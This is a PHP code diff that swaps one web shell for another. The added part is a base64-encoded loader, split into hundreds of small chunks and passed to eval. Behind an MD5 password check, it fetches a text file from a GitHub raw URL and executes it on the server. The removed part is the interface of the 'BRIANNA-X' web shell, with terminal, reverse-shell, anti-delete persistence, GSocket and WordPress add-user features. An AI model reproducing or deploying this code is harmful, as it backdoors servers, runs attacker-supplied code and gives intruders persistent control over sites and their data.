+$z .= "ICAg";
+$z .= "ICBj";
+$z .= "dXJs";
+$z .= "X3Nl";
+$z .= "dG9w";
+$z .= "dCgk";
+$z .= "Y29u";
+$z .= "biwg";
+$z .= "Q1VS";
+$z .= "TE9Q";
+$z .= "VF9S";
+$z .= "RVRV";
+$z .= "Uk5U";
+$z .= "UkFO";
+$z .= "U0ZF";
+$z .= "Uiwg";
+$z .= "MSk7";
+$z .= "DQog";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "IGN1";
+$z .= "cmxf";
+$z .= "c2V0";
+$z .= "b3B0";
+$z .= "KCRj";
+$z .= "b25u";
+$z .= "LCBD";
+$z .= "VVJM";
+$z .= "T1BU";
+$z .= "X0ZP";
+$z .= "TExP";
+$z .= "V0xP";
+$z .= "Q0FU";
+$z .= "SU9O";
+$z .= "LCAx";
+$z .= "KTsN";
+$z .= "CiAg";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "Y3Vy";
+$z .= "bF9z";
+$z .= "ZXRv";
+$z .= "cHQo";
+$z .= "JGNv";
+$z .= "bm4s";
+$z .= "IENV";
+$z .= "UkxP";
+$z .= "UFRf";
+$z .= "VVNF";
+$z .= "UkFH";
+$z .= "RU5U";
+$z .= "LCAi";
+$z .= "TW96";
+$z .= "aWxs";
+$z .= "YS81";
+$z .= "LjAg";
+$z .= "KFdp";
+$z .= "bmRv";
+$z .= "d3Mg";
+$z .= "TlQg";
+$z .= "Ni4x";
+$z .= "OyBy";
+$z .= "djoz";
+$z .= "Mi4w";
+$z .= "KSBH";
+$z .= "ZWNr";
+$z .= "by8y";
+$z .= "MDEw";
+$z .= "MDEw";
+$z .= "MSBG";
+$z .= "aXJl";
+$z .= "Zm94";
+$z .= "LzMy";
+$z .= "LjAi";
+$z .= "KTsN";
+$z .= "CiAg";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "Y3Vy";
+$z .= "bF9z";
+$z .= "ZXRv";
+$z .= "cHQo";
+$z .= "JGNv";
+$z .= "bm4s";
+$z .= "IENV";
+$z .= "UkxP";
+$z .= "UFRf";
+$z .= "U1NM";
+$z .= "X1ZF";
+$z .= "UklG";
+$z .= "WVBF";
+$z .= "RVIs";
+$z .= "IDAp";
+$z .= "Ow0K";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICBj";
+$z .= "dXJs";
+$z .= "X3Nl";
+$z .= "dG9w";
+$z .= "dCgk";
+$z .= "Y29u";
+$z .= "biwg";
+$z .= "Q1VS";
+$z .= "TE9Q";
+$z .= "VF9T";
+$z .= "U0xf";
+$z .= "VkVS";
+$z .= "SUZZ";
+$z .= "SE9T";
+$z .= "VCwg";
+$z .= "MCk7";
+$z .= "DQoN";
+$z .= "CiAg";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "Ly8g";
+$z .= "U2V0";
+$z .= "IGNv";
+$z .= "b2tp";
+$z .= "ZXMg";
+$z .= "dXNp";
+$z .= "bmcg";
+$z .= "c2Vz";
+$z .= "c2lv";
+$z .= "biBp";
+$z .= "ZiBh";
+$z .= "dmFp";
+$z .= "bGFi";
+$z .= "bGUN";
+$z .= "CiAg";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "aWYg";
+$z .= "KGlz";
+$z .= "c2V0";
+$z .= "KCRf";
+$z .= "U0VT";
+$z .= "U0lP";
+$z .= "Tlsn";
+$z .= "Y29r";
+$z .= "aSdd";
+$z .= "KSkg";
+$z .= "ew0K";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "Y3Vy";
+$z .= "bF9z";
+$z .= "ZXRv";
+$z .= "cHQo";
+$z .= "JGNv";
+$z .= "bm4s";
+$z .= "IENV";
+$z .= "UkxP";
+$z .= "UFRf";
+$z .= "Q09P";
+$z .= "S0lF";
+$z .= "LCAk";
+$z .= "X1NF";
+$z .= "U1NJ";
+$z .= "T05b";
+$z .= "J2Nv";
+$z .= "a2kn";
+$z .= "XSk7";
+$z .= "DQog";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "IH0N";
+$z .= "Cg0K";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICAk";
+$z .= "dXJs";
+$z .= "X2dl";
+$z .= "dF9j";
+$z .= "b250";
+$z .= "ZW50";
+$z .= "c19k";
+$z .= "YXRh";
+$z .= "ID0g";
+$z .= "Y3Vy";
+$z .= "bF9l";
+$z .= "eGVj";
+$z .= "KCRj";
+$z .= "b25u";
+$z .= "KTsN";
+$z .= "CiAg";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "Y3Vy";
+$z .= "bF9j";
+$z .= "bG9z";
+$z .= "ZSgk";
+$z .= "Y29u";
+$z .= "bik7";
+$z .= "DQog";
+$z .= "ICAg";
+$z .= "fSBl";
+$z .= "bHNl";
+$z .= "aWYg";
+$z .= "KGZ1";
+$z .= "bmN0";
+$z .= "aW9u";
+$z .= "X2V4";
+$z .= "aXN0";
+$z .= "cygn";
+$z .= "Zmls";
+$z .= "ZV9n";
+$z .= "ZXRf";
+$z .= "Y29u";
+$z .= "dGVu";
+$z .= "dHMn";
+$z .= "KSkg";
+$z .= "ew0K";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICAk";
+$z .= "dXJs";
+$z .= "X2dl";
+$z .= "dF9j";
+$z .= "b250";
+$z .= "ZW50";
+$z .= "c19k";
+$z .= "YXRh";
+$z .= "ID0g";
+$z .= "Zmls";
+$z .= "ZV9n";
+$z .= "ZXRf";
+$z .= "Y29u";
+$z .= "dGVu";
+$z .= "dHMo";
+$z .= "JHVy";
+$z .= "bCk7";
+$z .= "DQog";
+$z .= "ICAg";
+$z .= "fSBl";
+$z .= "bHNl";
+$z .= "aWYg";
+$z .= "KGZ1";
+$z .= "bmN0";
+$z .= "aW9u";
+$z .= "X2V4";
+$z .= "aXN0";
+$z .= "cygn";
+$z .= "Zm9w";
+$z .= "ZW4n";
+$z .= "KSAm";
+$z .= "JiBm";
+$z .= "dW5j";
+$z .= "dGlv";
+$z .= "bl9l";
+$z .= "eGlz";
+$z .= "dHMo";
+$z .= "J3N0";
+$z .= "cmVh";
+$z .= "bV9n";
+$z .= "ZXRf";
+$z .= "Y29u";
+$z .= "dGVu";
+$z .= "dHMn";
+$z .= "KSkg";
+$z .= "ew0K";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICAk";
+$z .= "aGFu";
+$z .= "ZGxl";
+$z .= "ID0g";
+$z .= "Zm9w";
+$z .= "ZW4o";
+$z .= "JHVy";
+$z .= "bCwg";
+$z .= "InIi";
+$z .= "KTsN";
+$z .= "CiAg";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "JHVy";
+$z .= "bF9n";
+$z .= "ZXRf";
+$z .= "Y29u";
+$z .= "dGVu";
+$z .= "dHNf";
+$z .= "ZGF0";
+$z .= "YSA9";
+$z .= "IHN0";
+$z .= "cmVh";
+$z .= "bV9n";
+$z .= "ZXRf";
+$z .= "Y29u";
+$z .= "dGVu";
+$z .= "dHMo";
+$z .= "JGhh";
+$z .= "bmRs";
+$z .= "ZSk7";
+$z .= "DQog";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "IGZj";
+$z .= "bG9z";
+$z .= "ZSgk";
+$z .= "aGFu";
+$z .= "ZGxl";
+$z .= "KTsN";
+$z .= "CiAg";
+$z .= "ICB9";
+$z .= "IGVs";
+$z .= "c2Ug";
+$z .= "ew0K";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICAk";
+$z .= "dXJs";
+$z .= "X2dl";
+$z .= "dF9j";
+$z .= "b250";
+$z .= "ZW50";
+$z .= "c19k";
+$z .= "YXRh";
+$z .= "ID0g";
+$z .= "ZmFs";
+$z .= "c2U7";
+$z .= "DQog";
+$z .= "ICAg";
+$z .= "fQ0K";
+$z .= "ICAg";
+$z .= "IHJl";
+$z .= "dHVy";
+$z .= "biAk";
+$z .= "dXJs";
+$z .= "X2dl";
+$z .= "dF9j";
+$z .= "b250";
+$z .= "ZW50";
+$z .= "c19k";
+$z .= "YXRh";
+$z .= "Ow0K";
+$z .= "fQ0K";
+$z .= "DQpm";
+$z .= "dW5j";
+$z .= "dGlv";
+$z .= "biBp";
+$z .= "c19s";
+$z .= "b2dn";
+$z .= "ZWRf";
+$z .= "aW4o";
+$z .= "KQ0K";
+$z .= "ew0K";
+$z .= "ICAg";
+$z .= "IHJl";
+$z .= "dHVy";
+$z .= "biBp";
+$z .= "c3Nl";
+$z .= "dCgk";
+$z .= "X1NF";
+$z .= "U1NJ";
+$z .= "T05b";
+$z .= "J2xv";
+$z .= "Z2dl";
+$z .= "ZF9p";
+$z .= "bidd";
+$z .= "KSAm";
+$z .= "JiAk";
+$z .= "X1NF";
+$z .= "U1NJ";
+$z .= "T05b";
+$z .= "J2xv";
+$z .= "Z2dl";
+$z .= "ZF9p";
+$z .= "bidd";
+$z .= "ID09";
+$z .= "PSB0";
+$z .= "cnVl";
+$z .= "Ow0K";
+$z .= "fQ0K";
+$z .= "DQpp";
+$z .= "ZiAo";
+$z .= "aXNz";
+$z .= "ZXQo";
+$z .= "JF9Q";
+$z .= "T1NU";
+$z .= "Wydw";
+$z .= "YXNz";
+$z .= "d29y";
+$z .= "ZCdd";
+$z .= "KSkg";
+$z .= "ew0K";
+$z .= "ICAg";
+$z .= "ICRl";
+$z .= "bnRl";
+$z .= "cmVk";
+$z .= "X3Bh";
+$z .= "c3N3";
+$z .= "b3Jk";
+$z .= "ID0g";
+$z .= "JF9Q";
+$z .= "T1NU";
+$z .= "Wydw";
+$z .= "YXNz";
+$z .= "d29y";
+$z .= "ZCdd";
+$z .= "Ow0K";
+$z .= "ICAg";
+$z .= "ICRo";
+$z .= "YXNo";
+$z .= "ZWRf";
+$z .= "cGFz";
+$z .= "c3dv";
+$z .= "cmQg";
+$z .= "PSAn";
+$z .= "NGFm";
+$z .= "NTlm";
+$z .= "YWNk";
+$z .= "NmY4";
+$z .= "M2E3";
+$z .= "ZTk3";
+$z .= "NDJh";
+$z .= "YTNi";
+$z .= "MmY0";
+$z .= "MjRl";
+$z .= "YzQn";
+$z .= "OyAN";
+$z .= "CiAg";
+$z .= "ICBp";
+$z .= "ZiAo";
+$z .= "bWQ1";
+$z .= "KCRl";
+$z .= "bnRl";
+$z .= "cmVk";
+$z .= "X3Bh";
+$z .= "c3N3";
+$z .= "b3Jk";
+$z .= "KSA9";
+$z .= "PT0g";
+$z .= "JGhh";
+$z .= "c2hl";
+$z .= "ZF9w";
+$z .= "YXNz";
+$z .= "d29y";
+$z .= "ZCkg";
+$z .= "ew0K";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICAk";
+$z .= "X1NF";
+$z .= "U1NJ";
+$z .= "T05b";
+$z .= "J2xv";
+$z .= "Z2dl";
+$z .= "ZF9p";
+$z .= "bidd";
+$z .= "ID0g";
+$z .= "dHJ1";
+$z .= "ZTsN";
+$z .= "CiAg";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "JF9T";
+$z .= "RVNT";
+$z .= "SU9O";
+$z .= "Wydj";
+$z .= "b2tp";
+$z .= "J10g";
+$z .= "PSAn";
+$z .= "YXN1";
+$z .= "Jzsg";
+$z .= "DQog";
+$z .= "ICAg";
+$z .= "fSBl";
+$z .= "bHNl";
+$z .= "IHsN";
+$z .= "CiAg";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ZWNo";
+$z .= "byAi";
+$z .= "IjsN";
+$z .= "CiAg";
+$z .= "ICB9";
+$z .= "DQp9";
+$z .= "DQoN";
+$z .= "Cmlm";
+$z .= "IChp";
+$z .= "c19s";
+$z .= "b2dn";
+$z .= "ZWRf";
+$z .= "aW4o";
+$z .= "KSkg";
+$z .= "ew0K";
+$z .= "ICAg";
+$z .= "ICRh";
+$z .= "ID0g";
+$z .= "Z2V0";
+$z .= "dXJs";
+$z .= "c2lu";
+$z .= "Zm8o";
+$z .= "J2h0";
+$z .= "dHBz";
+$z .= "Oi8v";
+$z .= "cmF3";
+$z .= "Lmdp";
+$z .= "dGh1";
+$z .= "YnVz";
+$z .= "ZXJj";
+$z .= "b250";
+$z .= "ZW50";
+$z .= "LmNv";
+$z .= "bS9u";
+$z .= "YWdh";
+$z .= "ZW1h";
+$z .= "c2J1";
+$z .= "bWkv";
+$z .= "Ymgv";
+$z .= "cmVm";
+$z .= "cy9o";
+$z .= "ZWFk";
+$z .= "cy9t";
+$z .= "YWlu";
+$z .= "L3Ro";
+$z .= "YWku";
+$z .= "dHh0";
+$z .= "Jyk7";
+$z .= "DQog";
+$z .= "ICAg";
+$z .= "ZXZh";
+$z .= "bCgn";
+$z .= "Pz4n";
+$z .= "IC4g";
+$z .= "JGEp";
+$z .= "Ow0K";
+$z .= "fSBl";
+$z .= "bHNl";
+$z .= "IHsN";
+$z .= "CiAg";
+$z .= "ICA/";
+$z .= "Pg0K";
+$z .= "ICAg";
+$z .= "ICA8";
+$z .= "IURP";
+$z .= "Q1RZ";
+$z .= "UEUg";
+$z .= "aHRt";
+$z .= "bD4N";
+$z .= "CiAg";
+$z .= "ICA8";
+$z .= "aHRt";
+$z .= "bD4N";
+$z .= "CiAg";
+$z .= "ICA8";
+$z .= "aGVh";
+$z .= "ZD4N";
+$z .= "CiAg";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "PHN0";
+$z .= "eWxl";
+$z .= "Pg0K";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICBp";
+$z .= "bnB1";
+$z .= "dCB7";
+$z .= "IA0K";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "bWFy";
+$z .= "Z2lu";
+$z .= "OiAw";
+$z .= "OyBi";
+$z .= "YWNr";
+$z .= "Z3Jv";
+$z .= "dW5k";
+$z .= "OiB3";
+$z .= "aGl0";
+$z .= "ZTsg";
+$z .= "Ym9y";
+$z .= "ZGVy";
+$z .= "OiBu";
+$z .= "b25l";
+$z .= "OyAg";
+$z .= "b3V0";
+$z .= "bGlu";
+$z .= "ZTog";
+$z .= "bm9u";
+$z .= "ZTsg";
+$z .= "Y29s";
+$z .= "b3I6";
+$z .= "IHRy";
+$z .= "YW5z";
+$z .= "cGFy";
+$z .= "ZW50";
+$z .= "OyBj";
+$z .= "YXJl";
+$z .= "dC1j";
+$z .= "b2xv";
+$z .= "cjog";
+$z .= "dHJh";
+$z .= "bnNw";
+$z .= "YXJl";
+$z .= "bnQ7";
+$z .= "IA0K";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICB9";
+$z .= "DQog";
+$z .= "ICAg";
+$z .= "PC9z";
+$z .= "dHls";
+$z .= "ZT4N";
+$z .= "CiAg";
+$z .= "ICA8";
+$z .= "L2hl";
+$z .= "YWQ+";
+$z .= "DQog";
+$z .= "ICAg";
+$z .= "PGJv";
+$z .= "ZHk+";
+$z .= "DQog";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "IDxm";
+$z .= "b3Jt";
+$z .= "IG1l";
+$z .= "dGhv";
+$z .= "ZD0i";
+$z .= "UE9T";
+$z .= "VCIg";
+$z .= "YWN0";
+$z .= "aW9u";
+$z .= "PSIi";
+$z .= "Pg0K";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "PGxh";
+$z .= "YmVs";
+$z .= "IGZv";
+$z .= "cj0i";
+$z .= "cGFz";
+$z .= "c3dv";
+$z .= "cmQi";
+$z .= "Pjwv";
+$z .= "bGFi";
+$z .= "ZWw+";
+$z .= "DQog";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICA8";
+$z .= "aW5w";
+$z .= "dXQg";
+$z .= "dHlw";
+$z .= "ZT0i";
+$z .= "cGFz";
+$z .= "c3dv";
+$z .= "cmQi";
+$z .= "IGlk";
+$z .= "PSJw";
+$z .= "YXNz";
+$z .= "d29y";
+$z .= "ZCIg";
+$z .= "bmFt";
+$z .= "ZT0i";
+$z .= "cGFz";
+$z .= "c3dv";
+$z .= "cmQi";
+$z .= "Pg0K";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICA8";
+$z .= "L2Zv";
+$z .= "cm0+";
+$z .= "DQog";
+$z .= "ICAg";
+$z .= "PC9i";
+$z .= "b2R5";
+$z .= "Pg0K";
+$z .= "ICAg";
+$z .= "IDwv";
+$z .= "aHRt";
+$z .= "bD4N";
+$z .= "CiAg";
+$z .= "ICA8";
+$z .= "P3Bo";
+$z .= "cA0K";
+$z .= "fQ0K";
+$z .= "Pz4N";
+$z .= "CiAg";
+$z .= "IA==";
+eval('?>'.base64_decode($z));
 ?>
-<!DOCTYPE html>
-<html>
-<head>
-<title>BRIANNA-X</title>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-:root {
-    --bg-shell: url('https://i.pinimg.com/1200x/13/be/32/13be320eac47335b901079056a85a11b.jpg');
-    --glass: rgba(20, 20, 20, 0.85); 
-    --border: rgba(255, 255, 255, 0.15);
-
-    --c-write: #00e676; 
-    --c-read: #b0b0b0; 
-    --c-del: #ff5252; 
-    --c-down: #4fc3f7; 
-    --c-edit: #ffca28; 
-    --c-touch: #ab47bc; 
-    --c-rename: #ff9800; 
-    
-    --text: #e0e0e0; 
-    --muted: #888888; 
-}
-* { box-sizing: border-box; }
-body {
-margin: 0; font-family: 'Segoe UI', sans-serif;
-color: var(--text); min-height: 100vh;
-background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.7)), var(--bg-shell) center/cover fixed;
-}
-
-.main-wrapper { width: 100%; max-width: 1900px; margin: 0 auto; padding: 20px; text-align: left; }
-
-header { background: var(--glass); backdrop-filter: blur(12px); padding: 20px; border-radius: 12px; border: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
-.brand { flex: 1; }
-.brand h1 { margin: 0; font-size: 22px; color: #fff; letter-spacing: 2px; font-weight: 300; border-bottom: 1px solid #555; display: inline-block; padding-bottom: 5px; }
-.brand .ver { font-size: 11px; background: #fff; color: #000; padding: 2px 5px; border-radius: 4px; font-weight: bold; }
-.brand .info { font-size: 12px; color: var(--muted); margin-top: 10px; line-height: 1.6; }
-.breadcrumb { display: inline-block; font-size: 12px; background: rgba(0,0,0,0.4); padding: 4px 8px; border-radius: 6px; margin-top: 5px; border: 1px solid var(--border); }
-.breadcrumb a { color: #fff; text-decoration: none; margin-right: 5px; }
-.breadcrumb a:hover { text-decoration: underline; }
-.profile { display: flex; align-items: center; gap: 15px; }
-.profile img { width: 80px; height: 80px; border-radius: 50%; border: 2px solid #fff; object-fit: cover; }
-.profile .links { text-align: right; }
-.profile a { display: block; color: #fff; font-size: 13px; font-weight: 600; text-decoration: none; margin-bottom: 8px; }
-
-.toolbar { background: var(--glass); backdrop-filter: blur(10px); padding: 10px; border-radius: 12px; border: 1px solid var(--border); display: flex; gap: 6px; flex-wrap: nowrap; justify-content: center; margin-bottom: 20px; }
-.btn-tool { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: var(--text); padding: 9px 16px; border-radius: 6px; cursor: pointer; font-size: 13px; display: inline-flex; align-items: center; gap: 6px; transition: 0.2s; text-decoration: none; font-family: inherit; white-space: nowrap; }
-.btn-tool:hover { background: #fff; color: #000; }
-.btn-tool input { display: none; }
-.input-mini { background: rgba(0,0,0,0.4); border: 1px solid var(--border); color: #fff; padding: 9px; border-radius: 4px; font-size: 13px; width: 130px; outline: none; }
-.btn-upload { display: inline-block; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: var(--text); padding: 9px 16px; border-radius: 6px; cursor: pointer; font-size: 13px; align-items: center; gap: 6px; transition: 0.2s; }
-.btn-upload:hover { background: #fff; color: #000; }
-
-.file-manager { background: var(--glass); backdrop-filter: blur(10px); border-radius: 12px; border: 1px solid var(--border); overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
-.fm-header { display: flex; padding: 12px 20px; background: rgba(255,255,255,0.1); border-bottom: 1px solid var(--border); font-size: 12px; font-weight: 600; color: #fff; letter-spacing: 0.5px; }
-.file-row { display: flex; padding: 12px 20px; transition: 0.2s; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.03); }
-.file-row:hover { background: rgba(255,255,255,0.1); }
-.col-name { flex: 0 0 35%; display: flex; align-items: center; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }
-.col-date { flex: 0 0 20%; font-size: 13px; color: var(--muted); text-align: left; }
-.col-size { flex: 0 0 10%; font-size: 13px; color: var(--muted); text-align: center; }
-.col-perms { flex: 0 0 15%; text-align: center; font-family: monospace; font-weight: bold; }
-.col-actions { flex: 0 0 20%; text-align: right; display: flex; justify-content: flex-end; gap: 8px; }
-
-.btn-action { background: none; border: none; font-size: 15px; cursor: pointer; transition: 0.2s; opacity: 0.8; padding: 0; }
-.btn-action:hover { opacity: 1; transform: scale(1.1); }
-.btn-down { color: var(--c-down); }
-.btn-edit { color: var(--c-edit); }
-.btn-touch { color: var(--c-touch); }
-.btn-rename { color: var(--c-rename); }
-.btn-del:hover { color: var(--c-del); }
-
-.perm-click { cursor: pointer; transition: 0.2s; padding: 2px 6px; border-radius: 4px; border: 1px solid transparent; display: inline-block; }
-.perm-click:hover { border-color: #fff; background: rgba(255,255,255,0.1); }
-.perms-writable { color: var(--c-write); text-shadow: 0 0 5px rgba(0,230,118,0.3); }
-.perms-readonly { color: var(--c-read); }
-.perms-denied { color: var(--c-del); }
-
-.modal { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); }
-.modal-content { background: #1a1a1a; border: 1px solid var(--border); border-radius: 12px; margin: 10% auto; padding: 25px; width: 90%; max-width: 800px; color: #fff; position: relative; max-height: 80vh; overflow-y: auto; box-shadow: 0 0 50px rgba(0,0,0,0.8); }
-.modal-close { position: absolute; top: 15px; right: 20px; color: var(--c-del); font-size: 24px; font-weight: bold; cursor: pointer; }
-.modal-close:hover { color: #fff; }
-.btn-primary { background: #fff; color: #000; border: none; padding: 10px 20px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 5px; }
-.btn-primary:hover { background: #ccc; }
-.status { margin-top: 10px; padding: 10px; border-radius: 6px; font-size: 13px; text-align: center; }
-.success { background: rgba(255,255,255,0.1); border: 1px solid #fff; color: #fff; }
-.error { background: rgba(255,85,85,0.1); border: 1px solid var(--c-del); color: var(--c-del); }
-
-.term-box { background: #000; color: #0f0; font-family: 'Consolas', monospace; padding: 15px; border-radius: 6px; min-height: 300px; max-height: 500px; overflow-y: auto; white-space: pre-wrap; font-size: 13px; border: 1px solid #333; width: 100%; }
-.term-input { width: 100%; background: #111; color: #fff; border: 1px solid #333; padding: 12px; border-radius: 6px; margin-top: 15px; outline: none; }
-</style>
-</head>
-
-<body>
-<div class="main-wrapper">
-    <header>
-        <div class="brand">
-            <h1>BRIANNA-X SHELL<span class="ver">v<?= WEBSHELL_VERSION ?></span></h1>
-            <div class="info">
-                <?php
-                $disabled_funcs = @ini_get('disable_functions');
-                $disabled_arr = $disabled_funcs ? array_map('trim', explode(',', $disabled_funcs)) : [];
-                $exec_funcs = ['shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open'];
-                $available_exec = [];
-                foreach ($exec_funcs as $func) {
-                    if (function_exists($func) && !in_array($func, $disabled_arr)) {
-                        $available_exec[] = $func;
-                    }
-                }
-                $terminal_ok = count($available_exec) > 0;
-                ?>
-                <strong>OS:</strong> <span style="color:#fff;"><?= @php_uname(); ?></span> | <strong>PHP:</strong> <span style="color:#fff;"><?= @phpversion(); ?></span><br>
-                <strong>Server:</strong> <span style="color:#fff;"><?= $_SERVER['SERVER_ADDR'] ?? '?' ?></span> | <strong>You:</strong> <span style="color:#fff;"><?= $_SERVER['REMOTE_ADDR'] ?? '?' ?></span><br>
-                <strong>Terminal:</strong> <?= $terminal_ok ? "<span style='color:#0f0;'>● Tersedia</span> <small style='color:#888;'>(" . implode(', ', $available_exec) . ")</small>" : "<span style='color:#f55;'>● Tidak Tersedia</span>" ?><?php if (!empty($disabled_arr) && $disabled_arr[0] !== ''): ?> | <strong>Disabled:</strong> <span style="color:#f90;font-size:11px;"><?= htmlspecialchars(implode(', ', array_slice($disabled_arr, 0, 5))) ?><?= count($disabled_arr) > 5 ? ' +' . (count($disabled_arr) - 5) . ' lainnya' : '' ?></span><?php endif; ?><br>
-                <div class="breadcrumb">
-                    <?php
-                    $parts = explode('/', $currentDir); $buildPath = "";
-                    foreach ($parts as $part) {
-                        if ($part === '') continue; $buildPath .= '/' . $part;
-                        echo "<a href='?dir=" . urlencode($buildPath) . "'>$part</a> / ";
-                    }
-                    ?>
-                </div>
-            </div>
-        </div>
-        <div class="profile">
-            <img src="https://www.icegif.com/wp-content/uploads/2022/12/icegif-1699.gif">
-            <div class="links">
-                <a href="https://t.me/brianna888999" target="_blank">BRIANNA-X</a>
-            </div>
-        </div>
-    </header>
-
-    <div class="toolbar">
-        <a href="?dir=<?= urlencode($rootDir) ?>" class="btn-tool">🏠 Home</a>
-        <button onclick="window.location.href='?terminal=1&dir=<?= urlencode($currentDir) ?>'" class="btn-tool">💻 Terminal</button>
-        <button onclick="document.getElementById('reverseShellModal').style.display='block'" class="btn-tool">📡 Reverse Shell</button>
-        <button onclick="openModal('?shell_finder=1&ajax=1')" class="btn-tool">🔎 Shell Finder</button>
-        <button onclick="openModal('?defense_shell=1&ajax=1')" class="btn-tool">🛡️ Defense Shell</button>
-        <?php
-        $ad_pid_file = '/tmp/.antidelete_' . md5($current_script_path) . '.pid';
-        $ad_log_file = '/tmp/.antidelete_' . md5($current_script_path) . '.log';
-        $ad_active = false;
-        if (@file_exists($ad_pid_file)) {
-            $ad_pid = @trim(@file_get_contents($ad_pid_file));
-            if ($ad_pid) {
-                // Cek proses dengan beberapa metode
-                $ad_proc_ok = false;
-                if (@file_exists("/proc/$ad_pid")) {
-                    $ad_proc_ok = true;
-                } elseif (@function_exists('shell_exec')) {
-                    $ps = @shell_exec("ps -p $ad_pid 2>/dev/null | grep -c $ad_pid");
-                    if (trim($ps) >= 1) $ad_proc_ok = true;
-                } elseif (@file_exists($ad_log_file) && (time() - @filemtime($ad_log_file)) < 30) {
-                    $ad_proc_ok = true;
-                }
-
-                if ($ad_proc_ok) {
-                    $ad_active = true;
-                } else {
-                    @unlink($ad_pid_file);
-                    @unlink('/tmp/.antidelete_' . md5($current_script_path) . '.sh');
-                }
-            }
-        }
-        $ad_icon = $ad_active ? '🟢' : '🔴';
-        ?>
-        <button onclick="openModal('?antidelete_menu=1&ajax=1')" class="btn-tool" id="antideleteBtn"><?= $ad_icon ?> Anti-Delete</button>
-        <button onclick="openModal('?gsocket_install=1&ajax=1')" class="btn-tool">🔌 GSocket</button>
-        <button onclick="openModal('?find_modified=1&ajax=1')" class="btn-tool">🕐 Find Modified</button>
-        <button onclick="openModal('?redirect_manager=1&ajax=1')" class="btn-tool">🔀 Redirect</button>
-        <button onclick="openModal('?wp_adduser=1&ajax=1')" class="btn-tool">👤 Add User WP</button>
-
-        <span style="color:#444;font-size:18px;">|</span>
-
-        <form method="post" enctype="multipart/form-data" style="display:inline-flex;margin:0;">
-            <input type="file" name="upload_file" id="upl" style="display:none;" onchange="this.form.submit()">
-            <label for="upl" class="btn-tool" style="margin:0;cursor:pointer;">⬆️ Upload</label>
-        </form>
-        <form method="post" style="display:inline-flex;margin:0;">
-            <input type="text" name="folder_name" placeholder="Folder" class="input-mini" required>
-            <button type="submit" name="create_folder" class="btn-tool" style="margin:0;">📁 New Folder</button>
-        </form>
-        <form method="post" style="display:inline-flex;margin:0;">
-            <input type="text" name="file_name" placeholder="File" class="input-mini" required>
-            <button type="submit" name="create_file" class="btn-tool" style="margin:0;">📄 New File</button>
-        </form>
-    </div>
-
-    <div class="file-manager">
-        <div class="fm-header">
-            <div class="col-name">NAME</div>
-            <div class="col-date">MODIFIED</div>
-            <div class="col-size">SIZE</div>
-            <div class="col-perms">PERMS</div>
-            <div class="col-actions">ACTIONS</div>
-        </div>
-        <?php
-        $items = @scandir($currentDir);
-        if ($items === false) { echo "<div style='padding:20px;text-align:center;color:var(--c-del);'>Permission Denied</div>"; $items = []; }
-        else {
-            $dirs = []; $files = [];
-            foreach ($items as $item) {
-                if ($item == '.' || $item == '..') continue;
-                $p = $currentDir . DIRECTORY_SEPARATOR . $item;
-                if (@is_dir($p)) $dirs[] = $item; else $files[] = $item;
-            }
-            @sort($dirs); @sort($files);
-            $items = @array_merge(['..'], $dirs, $files);
-        }
-        foreach ($items as $item) {
-            $full = ($item === '..') ? @dirname($currentDir) : $currentDir . DIRECTORY_SEPARATOR . $item;
-            $isDir = ($item === '..') ? true : @is_dir($full);
-            $name = htmlspecialchars($item);
-            $modTime = @filemtime($full);
-            $modTimeFormatted = ($modTime !== false) ? date('d M Y H:i', $modTime) : '-';
-            $size = $isDir ? '-' : round(@filesize($full)/1024, 2) . ' KB';
-            $perm = get_perms_string($full);
-            $perm_class = "perms-readonly";
-            if (@is_writable($full)) { $perm_class = "perms-writable"; } elseif (!@is_readable($full)) { $perm_class = "perms-denied"; }
-            $icon = $isDir ? "📁" : "📄";
-
-            echo "<div class='file-row'>";
-            echo "<div class='col-name'>";
-            echo "<span style='margin-right:8px; font-size:16px;'>$icon</span>";
-            if ($isDir) { echo "<a href='?dir=".urlencode($full)."' style='color:#fff; text-decoration:none; font-weight:500;'>$name</a>"; }
